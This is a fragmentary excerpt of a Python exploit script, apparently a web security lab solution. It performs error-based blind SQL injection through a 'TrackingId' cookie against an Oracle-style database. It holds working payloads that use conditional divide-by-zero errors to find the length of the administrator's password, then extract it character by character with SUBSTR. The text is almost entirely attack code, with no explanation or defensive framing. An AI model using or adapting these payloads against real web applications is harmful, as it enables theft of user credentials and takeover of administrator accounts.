...
#     payload = tracking_id + "'||(SELECT case when (1=2) then (1/0) else null end from dual)||'"
...
#     while True:
#         password_len += 1
#         payload = tracking_id + "'||(SELECT case when (LENGTH(password)={}) then (1/0) else null end from users where username='administrator')||'".format(password_len)
#         r = session.get(domain, cookies={'TrackingId': payload})
#         if not check_conditional_response(r):
#             break
#     return password_len
...
def get_password(session, domain, tracking_id, password_len):
    ...
    base_payload = tracking_id + "'||(SELECT case when (SUBSTR(password,{},1)='{}') then (1/0) else null end from users where username='administrator')||'"
